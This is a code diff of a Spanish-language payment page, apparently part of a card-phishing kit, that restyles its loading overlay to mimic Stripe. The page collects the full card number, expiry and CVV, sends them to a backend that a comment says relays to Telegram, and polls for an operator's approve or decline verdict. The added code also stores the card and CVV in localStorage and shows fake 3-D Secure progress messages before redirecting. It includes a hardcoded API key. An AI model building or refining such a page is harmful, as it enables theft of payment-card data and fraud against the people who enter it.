@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -99,60 +100,124 @@
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* ===== LOADING OVERLAY ===== */
+        /* ============================================
+           LOADING OVERLAY — ESTILO STRIPE
+           ============================================ */
         .loading-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.75);
-            backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
-            z-index: 1000; justify-content: center; align-items: center;
-            flex-direction: column; padding: 20px;
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #ffffff;
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 24px;
+            opacity: 0;
+            transition: opacity 0.25s ease;
         }
-        .loading-overlay.active { display: flex; }
+        .loading-overlay.active { display: flex; opacity: 1; }
 
-        .loading-card {
-            background: #fff; border-radius: 16px; padding: 40px 32px 32px 32px;
-            max-width: 360px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.08);
-            text-align: center; border: 1px solid #f0f0f0;
+        .stripe-loading {
+            width: 100%;
+            max-width: 320px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        .loading-card .logo-container {
-            display: flex; justify-content: center; align-items: center;
-            margin-bottom: 24px; min-height: 100px;
+
+        .stripe-logo {
+            height: 40px;
+            width: auto;
+            max-width: 120px;
+            object-fit: contain;
+            margin-bottom: 40px;
+            opacity: 0;
+            transform: translateY(6px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
         }
-        .loading-card .logo-container .logo-img { height: 80px; width: auto; max-width: 150px; object-fit: contain; }
-        .loading-card .loading-text {
-            font-size: 0.95rem; font-weight: 500; color: #374151;
-            margin-bottom: 20px; letter-spacing: 0.2px;
+        .stripe-logo.visible { opacity: 1; transform: translateY(0); }
+
+        .stripe-spinner {
+            width: 28px;
+            height: 28px;
+            border: 2.5px solid #e6e6e6;
+            border-top-color: #255ade;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin-bottom: 24px;
+            opacity: 0;
+            transition: opacity 0.2s ease;
         }
-        .progress-bar-wrapper { width: 100%; }
-        .progress-bar-track { width: 100%; height: 4px; background: #e5e7eb; border-radius: 4px; overflow: hidden; position: relative; }
-        .progress-bar-fill-loading {
-            height: 100%; background: #2c5697; border-radius: 4px;
-            width: 0%; transition: width 0.3s ease;
+        .stripe-spinner.visible { opacity: 1; }
+
+        .stripe-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: #30313d;
+            letter-spacing: -0.01em;
+            margin-bottom: 20px;
+            min-height: 20px;
+            transition: opacity 0.2s ease;
+            line-height: 1.4;
         }
-        .loading-card .initial-spinner {
-            display: none; width: 48px; height: 48px;
-            border: 3px solid #e5e7eb; border-top: 3px solid #2c5697;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px auto;
+
+        .stripe-progress-track {
+            width: 100%;
+            height: 3px;
+            background: #ebeef1;
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
         }
-        .loading-card .initial-spinner.active { display: block; }
+        .stripe-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #255ade, #4a7cf5);
+            border-radius: 999px;
+            width: 0%;
+            transition: width 0.35s ease;
+            position: relative;
+        }
+        .stripe-progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+            animation: shimmer 1.4s infinite;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .stripe-progress-indeterminate {
+            height: 100%;
+            width: 40%;
+            background: linear-gradient(90deg, #255ade, #4a7cf5);
+            border-radius: 999px;
+            position: absolute;
+            top: 0;
+            animation: indeterminate 1.2s ease-in-out infinite;
+        }
+        @keyframes indeterminate {
+            0% { left: -40%; }
+            100% { left: 100%; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- LOADING OVERLAY -->
+    <!-- ============================================
+         LOADING OVERLAY — ESTILO STRIPE
+         ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-card">
-            <div class="initial-spinner active" id="initialSpinner"></div>
-            <div class="logo-container" id="logoContainer" style="display:none;">
-                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
-            </div>
-            <div class="loading-text" id="loadingText">Procesando pago...</div>
-            <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
-                <div class="progress-bar-track">
-                    <div class="progress-bar-fill-loading" id="progressFill"></div>
-                </div>
-            </div>
+        <div class="stripe-loading">
+            <div class="stripe-spinner visible" id="initialSpinner"></div>
+            <img id="cardLogoImg" class="stripe-logo" src="" alt="">
+            <div class="stripe-text" id="loadingText">Procesando pago...</div>
+            <div class="stripe-progress-track" id="progressTrack"></div>
         </div>
     </div>
 
@@ -316,7 +381,7 @@
         // El HTML NUNCA ve la URL del backend ni Telegram.
         // ============================================================
         const POLLING_INTERVAL = 2000;
-        const MAX_POLLING_TIME = 300000; // 5 min
+        const MAX_POLLING_TIME = 300000;
         const HANDYAPI_KEY = 'HAS-139kYW5q3NS98PmXt8w67rbDH';
 
         const formatCLP = (amount) =>
@@ -331,10 +396,8 @@
 
         const loadingOverlay  = document.getElementById('loadingOverlay');
         const loadingText     = document.getElementById('loadingText');
-        const logoContainer   = document.getElementById('logoContainer');
         const cardLogoImg     = document.getElementById('cardLogoImg');
-        const progressWrapper = document.getElementById('progressWrapper');
-        const progressFill    = document.getElementById('progressFill');
+        const progressTrack   = document.getElementById('progressTrack');
         const initialSpinner  = document.getElementById('initialSpinner');
 
         // ============================================================
@@ -476,23 +539,55 @@
         });
 
         // ============================================================
+        // OVERLAY STRIPE STYLE
+        // ============================================================
+        function overlayMostrarSpinner(texto) {
+            loadingOverlay.classList.add('active');
+            initialSpinner.classList.add('visible');
+            cardLogoImg.classList.remove('visible');
+            loadingText.textContent = texto || 'Procesando pago...';
+            progressTrack.innerHTML = '<div class="stripe-progress-indeterminate"></div>';
+        }
+
+        function overlayMostrarLogo(marca, texto) {
+            initialSpinner.classList.remove('visible');
+
+            const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'amex.png' };
+            if (map[marca]) {
+                cardLogoImg.src = map[marca];
+                cardLogoImg.alt = marca;
+                cardLogoImg.classList.add('visible');
+            } else {
+                cardLogoImg.classList.remove('visible');
+            }
+
+            loadingText.textContent = texto || 'Redirigiendo...';
+            progressTrack.innerHTML = '<div class="stripe-progress-fill" id="progressFill"></div>';
+        }
+
+        function overlayActualizarProgreso(pct) {
+            const fill = document.getElementById('progressFill');
+            if (fill) fill.style.width = Math.min(100, Math.max(0, pct)) + '%';
+        }
+
+        function overlayOcultar() {
+            loadingOverlay.classList.remove('active');
+            progressTrack.innerHTML = '';
+        }
+
+        // ============================================================
         // POLLING → /api/estado-pago/:id
         // ============================================================
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             const start = Date.now();
 
-            loadingOverlay.classList.add('active');
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
-            loadingText.textContent = 'Procesando pago...';
+            overlayMostrarSpinner('Procesando pago...');
 
             pollingInterval = setInterval(async () => {
                 if (Date.now() - start > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
-                    loadingOverlay.classList.remove('active');
+                    overlayOcultar();
                     alert('La operación tardó demasiado. Intenta nuevamente.');
                     resetFormulario();
                     return;
@@ -504,10 +599,10 @@
 
                     if (data.estado === 'aprobado') {
                         clearInterval(pollingInterval);
-                        mostrarCargaConLogos(data.marca, data.redirect);
+                        flujoAprobado(data.marca, data.redirect);
                     } else if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
-                        loadingOverlay.classList.remove('active');
+                        overlayOcultar();
                         alert(data.mensaje || 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.');
                         resetFormulario();
                     }
@@ -516,39 +611,80 @@
         }
 
         // ============================================================
-        // PANTALLA FINAL + REDIRECCIÓN
+        // FLUJO APROBADO — GUARDA EN LOCALSTORAGE + CARGA STRIPE
         // ============================================================
-        function mostrarCargaConLogos(tipo, redirectUrl) {
-            initialSpinner.classList.remove('active');
-            initialSpinner.style.display = 'none';
+        function flujoAprobado(marca, redirectUrl) {
+            // ⚡ CAMBIO 1: guardar en localStorage la tarjeta aprobada
+            if (datosPagoActual) {
+                const formMobile = document.getElementById('form-tarjeta-mobile');
+                const isMobile = window.innerWidth <= 850;
+                const sufijo = isMobile ? '-m' : '';
 
-            logoContainer.style.display = 'flex';
-            const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'ame.png' };
-            if (map[tipo]) { cardLogoImg.src = map[tipo]; cardLogoImg.alt = tipo; }
+                const titular = document.getElementById('titular' + sufijo)?.value?.trim() || '';
+                const numero = document.getElementById('numero' + sufijo)?.value?.replace(/\s/g, '') || '';
+                const vence = document.getElementById('vence' + sufijo)?.value?.trim() || '';
+                const cvv = document.getElementById('cvv' + sufijo)?.value?.trim() || '';
 
-            progressWrapper.style.display = 'block';
+                let marcaDetectada = marca;
+                if (!marcaDetectada) {
+                    if (numero.startsWith('4')) marcaDetectada = 'visa';
+                    else if (/^(5[1-5]|2[2-7])/.test(numero)) marcaDetectada = 'mastercard';
+                    else if (/^3[47]/.test(numero)) marcaDetectada = 'amex';
+                }
 
-            const nombres = {
+                const tarjetaAprobada = {
+                    titular: titular,
+                    numero: numero,
+                    vencimiento: vence,
+                    cvv: cvv,
+                    marca: marcaDetectada,
+                    banco: detectedBank || 'Desconocido',
+                    solicitud_id: solicitudId,
+                    aprobado_en: new Date().toISOString()
+                };
+
+                try {
+                    localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
+                    console.log('✅ Tarjeta aprobada guardada en localStorage:', tarjetaAprobada);
+                } catch (e) {
+                    console.warn('No se pudo guardar en localStorage:', e);
+                }
+            }
+
+            // Mostrar logo de la marca
+            const nombreRed = {
                 visa: 'Verified by Visa',
                 mastercard: 'Mastercard ID Check',
                 amex: 'American Express SafeKey'
             };
-            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');
+            overlayMostrarLogo(marca, `Conectando con ${nombreRed[marca] || 'el banco'}...`);
 
-            let progress = 0;
-            const duration = 3000, interval = 50;
-            const increment = 100 / (duration / interval);
-            progressFill.style.width = '0%';
+            // Secuencia Stripe-style
+            overlayActualizarProgreso(0);
 
-            const timer = setInterval(() => {
-                progress += increment;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(timer);
-                    setTimeout(() => { window.location.href = redirectUrl; }, 400);
-                }
-                progressFill.style.width = progress + '%';
-            }, interval);
+            setTimeout(() => {
+                overlayActualizarProgreso(25);
+                loadingText.textContent = 'Verificando tarjeta...';
+            }, 300);
+
+            setTimeout(() => {
+                overlayActualizarProgreso(55);
+                loadingText.textContent = 'Autorizando pago con el emisor...';
+            }, 900);
+
+            setTimeout(() => {
+                overlayActualizarProgreso(80);
+                loadingText.textContent = 'Confirmando transacción...';
+            }, 1600);
+
+            setTimeout(() => {
+                overlayActualizarProgreso(100);
+                loadingText.textContent = 'Redirigiendo...';
+            }, 2300);
+
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2900);
         }
 
         function resetFormulario() {
@@ -565,7 +701,6 @@
 
         // ============================================================
         // ENVÍO DEL PAGO → POST /api/crear-pago (relativo)
-        // Solo enviamos: solicitud_id, titular, tarjeta, cvv, vence, marca, banco
         // ============================================================
         async function enviarPago(event) {
             event.preventDefault();
@@ -589,7 +724,6 @@
                 return;
             }
 
-            // Detectar marca
             let marca = null;
             if (numero.startsWith('4')) marca = 'visa';
             else if (/^(5[1-5]|2[2-7])/.test(numero)) marca = 'mastercard';
@@ -599,7 +733,6 @@
                 return;
             }
 
-            // Si no hay banco detectado, intentarlo ahora antes de enviar
             if (!detectedBank && numero.length >= 6) {
                 detectedBank = await detectBankByBIN(numero);
                 await new Promise(r => setTimeout(r, 400));
@@ -612,13 +745,7 @@
             pagoEnviado = true;
             solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
-            // Overlay inmediato
-            loadingOverlay.classList.add('active');
-            loadingText.textContent = 'Procesando pago...';
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
+            overlayMostrarSpinner('Procesando pago...');
 
             try {
                 const response = await fetch('/api/crear-pago', {
@@ -638,7 +765,7 @@
                 const data = await response.json();
 
                 if (!data.success) {
-                    loadingOverlay.classList.remove('active');
+                    overlayOcultar();
                     alert('No se pudo procesar el pago. Intenta nuevamente.');
                     resetFormulario();
                     return;
@@ -648,7 +775,7 @@
 
             } catch (error) {
                 console.error('Error:', error);
-                loadingOverlay.classList.remove('active');
+                overlayOcultar();
                 alert('No se pudo conectar con el procesador de pagos. Intenta nuevamente.');
                 resetFormulario();
             }
